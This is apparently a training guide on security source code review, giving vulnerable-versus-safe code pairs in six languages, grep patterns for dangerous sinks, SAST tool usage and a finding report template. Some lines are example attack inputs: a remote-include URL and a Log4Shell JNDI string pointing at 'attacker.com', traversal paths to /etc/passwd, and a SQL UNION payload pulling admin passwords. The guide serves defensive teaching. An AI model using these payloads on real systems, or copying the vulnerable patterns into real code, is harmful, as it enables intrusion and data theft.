# Source Code Review

!!! info "Why This Matters"
    Source code review finds what dynamic testing misses — vulnerabilities in code paths that are hard to trigger through black-box testing, logic flaws visible only in code, and security anti-patterns that aren't yet exploitable but become so under certain conditions. At mid-level, you're expected to review code intelligently, not just run SAST tools and copy output.

---

## Methodology: How to Approach a Code Review

### The Two Approaches

**Top-down (entry point driven):** Start from user-controlled inputs (HTTP parameters, file uploads, API fields) and follow the data through the application — tracing how input is handled, transformed, and eventually used. This is **taint analysis** — tracking the flow of "tainted" (user-controlled) data.

**Bottom-up (sink driven):** Start from dangerous functions (the "sinks") and trace backwards to find if user-controlled data reaches them without sanitization. Examples: `execute()`, `eval()`, `innerHTML=`, `Runtime.exec()`, `system()`.

**Best practice:** Use both. Start with bottom-up to find quick wins (dangerous functions with little sanitization), then use top-down to understand complex logic and authorization flows.

---

## Taint Analysis

Taint analysis tracks the flow of user-controlled data through the application.

**Sources** — where user data enters:
```
HTTP request parameters, headers, cookies
JSON/XML body
File uploads
Database query results (from previously injected data)
Environment variables (if user-controllable)
WebSocket messages
```

**Sanitizers/Validators** — transformations that might make data safe:
```
Input validation (whitelist-based = good; blacklist-based = often bypassable)
Encoding (htmlspecialchars, urlencode)
Parameterized queries
Escaping functions
```

**Sinks** — dangerous operations:
```
SQL: execute(), query(), rawQuery()
OS: exec(), system(), popen(), Runtime.exec(), subprocess.call()
HTML: innerHTML, document.write(), dangerouslySetInnerHTML
File: include(), require(), readFile(), writeFile(), fopen()
Network: fetch(), curl(), urllib.request (SSRF)
Serialization: unserialize(), pickle.loads(), ObjectInputStream.readObject()
Eval: eval(), Function(), setTimeout(string)
```

If tainted data reaches a sink without adequate sanitization — it's a vulnerability.

---

## Language-Specific Dangerous Patterns

### PHP

PHP is historically security-weak. Common patterns:

```php
// SQL Injection — classic
$query = "SELECT * FROM users WHERE id=" . $_GET['id'];
mysql_query($query);  // Older deprecated API — doubly bad

// Safe version:
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);

// Remote File Inclusion (RFI) / Local File Inclusion (LFI)
include($_GET['page'] . '.php');  // LFI: page=../../../../etc/passwd
// RFI (if allow_url_include=On): page=http://attacker.com/shell

// Command injection
system("convert " . $_POST['filename'] . " output.jpg");
exec("ping " . $_POST['host']);
shell_exec(), passthru(), popen(), proc_open()  // All dangerous with user input

// Object injection (PHP unserialize)
$data = unserialize($_COOKIE['data']);  // If PHP classes with __wakeup/__destruct exist

// XSS
echo $_GET['name'];                           // Direct echo of user input
echo "<p>Welcome, " . $_GET['name'] . "</p>"; // Same

// File upload without validation
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
// No extension check, no content validation

// Dangerous functions to search for:
grep -r "eval\s*(\$" .
grep -r "unserialize\s*(" .
grep -r "\$_(GET|POST|REQUEST|COOKIE|SERVER)" . | grep -v "//"  # User input usage
grep -r "include\s*(\$\|require\s*(\$" .  # Dynamic includes
grep -r "shell_exec\|system\|exec\|passthru\|popen" .
```

### Python (Flask/Django)

```python
# SQL Injection — raw string formatting
cursor.execute("SELECT * FROM users WHERE id=" + request.args.get('id'))
cursor.execute(f"SELECT * FROM users WHERE name='{name}'")
cursor.execute("SELECT * FROM users WHERE name='%s'" % name)  # Still injectable!

# Safe:
cursor.execute("SELECT * FROM users WHERE name = %s", (name,))

# Django ORM injection (rare but possible with extra/raw)
User.objects.raw("SELECT * FROM users WHERE name='%s'" % name)  # Dangerous
User.objects.filter(name=name)  # Safe — ORM parameterizes

# Command injection
import subprocess, os
os.system("ping " + request.args.get('host'))          # Dangerous
subprocess.call("ls " + path, shell=True)               # shell=True is dangerous
subprocess.check_output(f"convert {filename}", shell=True)

# Safe:
subprocess.call(["ping", host])  # List form, no shell=True

# Template injection (SSTI — Jinja2)
from flask import render_template_string
template = request.args.get('name')
return render_template_string("Hello " + template)  # Never concatenate user input into template

# Safe:
return render_template_string("Hello {{ name }}", name=template)

# Insecure deserialization
import pickle
data = pickle.loads(request.data)  # Never deserialize untrusted data

# Path traversal
filename = request.args.get('file')
with open(f'/var/www/files/{filename}', 'r') as f:  # ../../etc/passwd
    return f.read()

# Search patterns:
grep -r "os\.system\|subprocess.*shell=True\|eval(" .
grep -r "pickle\.loads\|yaml\.load(" .  # yaml.load without Loader is dangerous
grep -r "render_template_string" .
grep -r "raw(\"SELECT\|\.execute(f\"\|\.execute(\".*%" .
```

### Java

```java
// SQL Injection — string concatenation
String query = "SELECT * FROM users WHERE id = " + request.getParameter("id");
Statement stmt = conn.createStatement();
stmt.execute(query);  // Vulnerable

// Safe — PreparedStatement
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, Integer.parseInt(id));

// Command injection
Runtime.getRuntime().exec("ls " + userInput);    // Dangerous
new ProcessBuilder("bash", "-c", "ls " + userInput).start();  // Dangerous with -c

// Safe:
new ProcessBuilder("ls", userInput).start();  // Array form, no shell interpretation

// XXE (XML parsing without security features)
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(inputStream);  // External entities enabled by default!

// Safe:
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setExpandEntityReferences(false);

// Insecure deserialization
ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
Object obj = ois.readObject();  // Arbitrary class deserialization

// Path traversal
String filename = request.getParameter("file");
File file = new File("/var/uploads/" + filename);
// Fix: validate filename doesn't contain ../ and resolve canonical path

// JNDI injection (Log4Shell pattern)
logger.info("User: " + request.getHeader("X-Forwarded-For"));
// ${jndi:ldap://attacker.com/exploit} in header → Log4Shell

// Search patterns:
grep -r "getRuntime()\.exec\|ProcessBuilder" .
grep -r "readObject()" .
grep -r "Statement.*execute\|createStatement" .
grep -r "getParameter\|getHeader\|getAttribute" . | grep -v "//.*getParameter"
```

### Node.js / JavaScript

```javascript
// SQL Injection
const query = `SELECT * FROM users WHERE id=${req.params.id}`;  // Template literal injection
db.query("SELECT * FROM users WHERE name='" + req.body.name + "'");

// Safe:
db.query("SELECT * FROM users WHERE name = ?", [req.body.name]);  // MySQL
db.query("SELECT * FROM users WHERE name = $1", [req.body.name]);  // PostgreSQL

// Command injection
const { exec } = require('child_process');
exec('ls ' + req.query.path);  // Dangerous

// Safe:
const { execFile } = require('child_process');
execFile('ls', [req.query.path]);  // Array form, no shell interpolation

// Prototype pollution
function merge(target, source) {
    for (let key in source) {
        target[key] = source[key];  // __proto__ can be a key!
    }
}
// merge({}, JSON.parse('{"__proto__":{"admin":true}}'))
// → All objects get .admin = true

// XSS via dangerouslySetInnerHTML (React)
return <div dangerouslySetInnerHTML={{__html: userContent}} />;

// Path traversal
const file = req.query.file;
fs.readFile(path.join(__dirname, 'uploads', file), ...);
// ../../etc/passwd → outside uploads dir

// Insecure eval
eval(req.body.code);  // Never
new Function(req.body.code)();  // Never

// Search patterns:
grep -r "eval\|new Function\|dangerouslySetInnerHTML" .
grep -r "child_process.*exec\b" .  # exec but not execFile
grep -r "req\.\(body\|params\|query\)" . | grep -v "//.*req\."
grep -r "__proto__\|prototype\[" .
```

---

## SAST Tools

### Semgrep — Recommended

Pattern-based static analysis. Fast, accurate, customizable, open-source.

```bash
# Install
pip install semgrep

# Scan with auto-detection (detects language, picks rules)
semgrep --config auto /path/to/code

# Scan with specific rulesets
semgrep --config p/owasp-top-ten /path/to/code
semgrep --config p/python /path/to/code
semgrep --config p/java /path/to/code
semgrep --config p/nodejs /path/to/code
semgrep --config p/php /path/to/code

# Output formats
semgrep --config auto --json /path/to/code > results.json
semgrep --config auto --sarif /path/to/code > results.sarif
semgrep --config auto --output results.txt /path/to/code

# Write custom rule (YAML):
cat > sql_injection.yaml << 'EOF'
rules:
  - id: raw-sql-query
    patterns:
      - pattern: |
          $CONN.execute("..." + $USER_INPUT)
      - pattern-not: |
          $CONN.execute("...", [$USER_INPUT])
    message: "Potential SQL injection: user input concatenated into query"
    languages: [python]
    severity: ERROR
EOF
semgrep --config sql_injection.yaml /path/to/code
```

### SonarQube

Enterprise SAST platform. Runs as a server, integrates with CI/CD pipelines.

```bash
# Docker setup
docker run -d --name sonarqube -p 9000:9000 sonarqube

# Scan with sonar-scanner
sonar-scanner \
  -Dsonar.projectKey=myproject \
  -Dsonar.sources=. \
  -Dsonar.host.url=http://localhost:9000 \
  -Dsonar.login=admin_token
```

### Bandit (Python)

```bash
pip install bandit
bandit -r /path/to/python/code -f json -o results.json
bandit -r /path/to/python/code -l  # Low severity and above
bandit -r /path/to/python/code -t B301,B302  # Specific test IDs
```

### Brakeman (Ruby on Rails)

```bash
gem install brakeman
brakeman /path/to/rails/app
brakeman -f json /path/to/rails/app > results.json
```

### ESLint Security Plugins (JavaScript)

```bash
npm install eslint eslint-plugin-security
# .eslintrc.json:
{
  "plugins": ["security"],
  "rules": {
    "security/detect-non-literal-regexp": "warn",
    "security/detect-object-injection": "warn",
    "security/detect-possible-timing-attacks": "warn"
  }
}
eslint --ext .js .
```

---

## Manual Code Review Workflow

### Step 1: Understand the Codebase

```bash
# Get a feel for size and structure
find . -name "*.py" | wc -l          # File count
wc -l $(find . -name "*.py")         # Total lines of code

# Identify frameworks
cat requirements.txt / package.json / pom.xml

# Find entry points (routes)
grep -r "@app.route\|@router\.\|app\.get\|app\.post" .   # Flask/Express routes
grep -r "RequestMapping\|GetMapping\|PostMapping" .        # Spring routes
grep -r "Route::" .                                         # Laravel routes

# Find authentication middleware
grep -r "auth_required\|@login_required\|@authenticate\|middleware" .
```

### Step 2: Map Data Flow

```bash
# Track where user input enters
grep -r "request\.\(args\|form\|json\|data\|files\)" .   # Flask
grep -r "req\.body\|req\.params\|req\.query" .             # Express
grep -r "request\.getParameter\|request\.getHeader" .      # Java Servlets

# Find where it's used
# Manual: follow the variable from entry point through functions
```

### Step 3: Check Authorization

```bash
# Find every endpoint and verify auth check exists
# Pattern: any function handling requests should call an auth check
grep -r "def.*view\|def.*endpoint\|def.*api" .
# Manually verify each has @login_required or equivalent

# Check for horizontal access control
grep -r "WHERE.*user_id\|filter.*user\|owned_by" .
# Verify WHERE clauses always filter by current user's ID
```

### Step 4: Check Cryptography

```bash
grep -r "md5\|sha1\|des\|rc4\|ecb" . -i  # Weak algorithms
grep -r "Random()\|Math\.random()" .       # Non-cryptographic random
grep -r "AES.*ECB\|ECB" .                  # ECB mode
grep -r "hardcoded\|password.*=.*['\"]" .  # Hardcoded secrets
grep -r "SECRET_KEY\|API_KEY\|password" . --include="*.py" --include="*.js"
```

### Step 5: Document Findings with Code References

For each finding, reference the exact file, line number, and code snippet:

```
Finding: SQL Injection
File: app/models/user.py, Line 47
Code:
    def get_user(user_id):
        query = "SELECT * FROM users WHERE id=" + str(user_id)
        return db.execute(query)
        
Source: user_id from request.args.get('id') at views/user.py:23
Sink: db.execute() at models/user.py:47
Path: views/user.py:23 → models/user.py:47 (no sanitization in between)
```

---

## .NET / C# — Dangerous Patterns

.NET applications are common in enterprise environments. Key vulnerability patterns:

```csharp
// SQL Injection — string concatenation
string query = "SELECT * FROM Users WHERE Username='" + username + "'";
SqlCommand cmd = new SqlCommand(query, conn);   // Vulnerable

// Safe — parameterized
string query = "SELECT * FROM Users WHERE Username=@username";
SqlCommand cmd = new SqlCommand(query, conn);
cmd.Parameters.AddWithValue("@username", username);   // Safe

// Command injection via Process.Start
Process.Start("cmd.exe", "/c ping " + userInput);      // Dangerous
Process.Start(new ProcessStartInfo {
    FileName = "ping",
    Arguments = userInput,   // Still dangerous if shell metacharacters
    UseShellExecute = false  // This is NOT sufficient protection alone
});

// File path traversal
string path = Server.MapPath("~/uploads/" + Request["filename"]);
File.ReadAllText(path);     // Vulnerable to ../../../web.config

// Safe — normalize and validate
string safeFilename = Path.GetFileName(Request["filename"]);  // Strip path
string fullPath = Path.Combine(Server.MapPath("~/uploads/"), safeFilename);
if (!fullPath.StartsWith(Server.MapPath("~/uploads/")))
    throw new Exception("Path traversal detected");

// Insecure deserialization
byte[] data = Convert.FromBase64String(Request["data"]);
BinaryFormatter formatter = new BinaryFormatter();
var obj = formatter.Deserialize(new MemoryStream(data));  // RCE risk

// XML External Entity (XXE)
XmlDocument doc = new XmlDocument();
doc.Load(inputStream);   // DTD processing enabled by default in older .NET

// Safe
XmlReaderSettings settings = new XmlReaderSettings {
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null
};

// Weak cryptography
MD5 md5 = MD5.Create();
byte[] hash = md5.ComputeHash(Encoding.UTF8.GetBytes(password)); // Never for passwords

// ECDH/RSA key too small
RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(512); // 512-bit = broken

// ViewState without encryption/MAC
// In web.config — if machineKey is absent or default, ViewState can be tampered

// Search patterns for .NET
grep -r "SqlCommand\|SqlConnection" . | grep -v "Parameters\|@"
grep -r "Process\.Start\|ProcessStartInfo" .
grep -r "BinaryFormatter\|NetDataContractSerializer\|ObjectStateFormatter" .
grep -r "XmlDocument\|XmlReader" . | grep -v "DtdProcessing.Prohibit"
grep -r "MD5\|SHA1\|DES\b" . -i
grep -r "File\.\(Read\|Write\|Open\)" . | grep "Request\["
```

---

## Ruby on Rails — Dangerous Patterns

```ruby
# SQL Injection in ActiveRecord
User.where("username = '#{params[:username]}'")        # Dangerous
User.where("username = ?", params[:username])          # Safe (parameterized)
User.where(username: params[:username])                # Safe (hash syntax)

# Mass assignment
@user = User.new(params[:user])    # All params assigned — dangerous
@user.update_attributes(params[:user])    # Same issue

# Safe — strong parameters (Rails 4+)
def user_params
  params.require(:user).permit(:username, :email)   # Whitelist only
end
@user = User.new(user_params)

# Command injection
system("convert #{params[:file]} output.jpg")     # Dangerous
system("convert", params[:file], "output.jpg")    # Safe (array form, no shell)

# File operations
send_file Rails.root.join("uploads", params[:file])  # Path traversal risk
# Safe: validate filename, check path is within expected directory

# YAML deserialization (pre-Rails 4 issue, still seen in legacy)
YAML.load(user_input)    # Arbitrary object deserialization
YAML.safe_load(user_input)  # Safe — restricts to basic types

# XSS — ERB template
<%= @user_input %>      # Auto-escaped in Rails — safe
<%= raw @user_input %>  # Bypasses escaping — XSS risk
<%= @user_input.html_safe %>  # Same — XSS risk

# Brakeman — Rails SAST tool
gem install brakeman
brakeman /path/to/rails/app
brakeman -f json -o brakeman.json /path/to/app
```

---

## Authorization Code Review Methodology

Authorization failures are the most common finding in mature applications. A systematic approach to reviewing authorization:

### Step 1: Map Every Action

For each controller/route, document what actions are available:
```
GET  /api/users           → list users
GET  /api/users/:id       → get specific user
PUT  /api/users/:id       → update user
DELETE /api/users/:id     → delete user
POST /api/admin/reset     → reset all data
```

### Step 2: For Each Action, Ask Three Questions

**Who CAN call this?** (What roles/permissions are required)
**Who DOES call this?** (Is the authorization check present and correct)
**Can the check be bypassed?** (Parameter manipulation, HTTP method switching, indirect reference)

### Step 3: Identify Missing Authorization Checks

```python
# Pattern: find all route handlers, check each for auth middleware
# Flask example
@app.route('/admin/users')
def admin_users():   # No @login_required or @admin_required — missing auth check
    return jsonify(User.query.all())

# Correct:
@app.route('/admin/users')
@admin_required    # Decorator enforces authorization
def admin_users():
    return jsonify(User.query.all())
```

### Step 4: Check Horizontal Authorization (Object Ownership)

```python
# Vulnerable pattern — no ownership check
@app.route('/api/invoice/<int:invoice_id>')
@login_required
def get_invoice(invoice_id):
    invoice = Invoice.query.get(invoice_id)   # Gets any invoice
    return jsonify(invoice.to_dict())

# Correct pattern — verify ownership
@app.route('/api/invoice/<int:invoice_id>')
@login_required
def get_invoice(invoice_id):
    invoice = Invoice.query.filter_by(
        id=invoice_id,
        user_id=current_user.id    # Must belong to requesting user
    ).first_or_404()
    return jsonify(invoice.to_dict())
```

### Step 5: Check State-Based Authorization

Some actions should only be available in certain states:

```python
# Vulnerable — can approve already-approved request
@app.route('/api/request/<int:req_id>/approve', methods=['POST'])
def approve_request(req_id):
    req = Request.query.get(req_id)
    req.status = 'approved'   # No check on current status
    db.session.commit()

# Correct — check state before transitioning
def approve_request(req_id):
    req = Request.query.get(req_id)
    if req.status != 'pending':
        abort(409, "Request cannot be approved in current state")
    req.status = 'approved'
    db.session.commit()
```

---

## Cryptography Code Review Checklist

```
Passwords:
□ Passwords hashed (not encrypted, not encoded)
□ Using bcrypt, scrypt, Argon2, or PBKDF2
□ Not using MD5, SHA-1, SHA-256 unsalted for passwords
□ Salt is random and per-user

Symmetric encryption:
□ AES-256 (not DES, 3DES, RC4, Blowfish)
□ GCM mode for AEAD (not ECB, avoid CBC without explicit need)
□ Random IV generated per encryption operation
□ Key stored securely (not hardcoded, not in source)

Random numbers:
□ Cryptographic RNG used (os.urandom, secrets, SecureRandom)
□ Math.random() / Random() not used for security decisions

Keys and secrets:
□ No hardcoded keys, passwords, API tokens in source
□ Secrets loaded from environment variables or secret manager
□ Keys rotated (not static forever)
□ Private keys protected (not in source, not committed to git)

Transport:
□ HTTPS enforced (HTTP disabled or redirected)
□ HSTS header present
□ TLS 1.2+ (TLS 1.0/1.1 disabled)
□ Strong cipher suites only

Signatures:
□ RSA keys ≥ 2048 bits (4096 preferred)
□ ECDSA using P-256 or stronger curves
□ Not using DSA (deprecated)
```

---

## Dependency Review

Third-party libraries introduce vulnerabilities. This is OWASP A06 (Vulnerable Components) and requires systematic checking.

```bash
# Node.js
npm audit                          # Built-in, checks against npm advisory database
npm audit --json > audit.json

# Python
pip install safety
safety check
safety check --json > safety.json

# pip audit
pip install pip-audit
pip-audit
pip-audit --format json > audit.json

# Java (Maven)
mvn dependency-check:check
# Generates HTML report with CVEs for all dependencies

# Java (Gradle)
./gradlew dependencyCheckAnalyze

# PHP
composer audit

# Ruby
gem install bundler-audit
bundle audit
bundle audit update  # Update advisory database first

# Go
go install golang.org/x/vuln/cmd/govulncheck@latest
govulncheck ./...

# .NET
dotnet list package --vulnerable

# Semgrep for dependency version checks
semgrep --config p/supply-chain .
```

**Key questions during dependency review:**
- Are there transitive dependencies with CVEs? (Not just direct dependencies)
- Are dependencies pinned to specific versions, or using loose ranges (^, ~)?
- Is there an automated process that flags new CVEs in dependencies?
- Are production and development dependencies separated? (devDependencies shouldn't go to prod)

---

## Source Code Review Report Format

Each finding from code review needs:

```
Finding: SQL Injection in User Search Endpoint
Severity: High (CVSS 8.1)
File: app/routes/users.py, Line 47
CWE: CWE-89 — SQL Injection

Vulnerable Code:
    def search_users():
        query = "SELECT * FROM users WHERE name LIKE '%" + request.args.get('q') + "%'"
        return db.execute(query).fetchall()

Source: request.args.get('q') at line 45
Sink: db.execute() at line 47
Data flow: No sanitization between source and sink

Impact: An attacker could extract the entire users database, 
modify records, or (if DBA privileges) execute OS commands.

Proof of Concept:
    GET /api/search?q=' UNION SELECT username,password,3 FROM admin_users--
    (Demonstrates extraction of admin table data)

Remediation:
    def search_users():
        q = request.args.get('q', '')
        query = "SELECT * FROM users WHERE name LIKE ?"
        return db.execute(query, ('%' + q + '%',)).fetchall()

References:
    OWASP SQL Injection Prevention Cheat Sheet
    CWE-89
```
